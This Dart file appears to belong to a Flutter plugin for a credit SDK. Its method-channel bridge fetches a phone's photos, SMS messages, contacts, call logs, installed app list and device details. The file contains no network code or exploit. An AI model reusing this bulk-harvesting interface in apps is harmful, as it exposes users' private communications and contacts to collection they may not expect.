import 'package:flutter/foundation.dart';
import 'package:flutter/services.dart';

import 'sdk_platform_interface.dart';

/// An implementation of [SdkPlatform] that uses method channels.
class MethodChannelSdk extends SdkPlatform {
  /// The method channel used to interact with the native platform.
  @visibleForTesting
  final methodChannel = const MethodChannel('sdk_credit');

  @override
  Future<String?> getPhoto() async {
    final result = await methodChannel.invokeMethod<String>('takePL');
    return result;
  }

  @override
  Future<String?> getSms() async {
    final rlt = await methodChannel.invokeMethod<String>('takeSL');
    return rlt;
  }

  @override
  Future<String?> getDevice() async {
    final rlt = await methodChannel.invokeMethod<String>('takeDI');
    return rlt;

  }

  @override
  Future<String?> getContact() async {
    final rlt = await methodChannel.invokeMethod<String>('takeCL');
    return rlt;
  }

  @override
  Future<String?> getAppList() async {
    final rlt = await methodChannel.invokeMethod<String>('takeAL');
    return rlt;
  }

  @override
  Future<String?> getCall() async {
    final rlt = await methodChannel.invokeMethod<String>('takeCI');
    return rlt;
  }
}
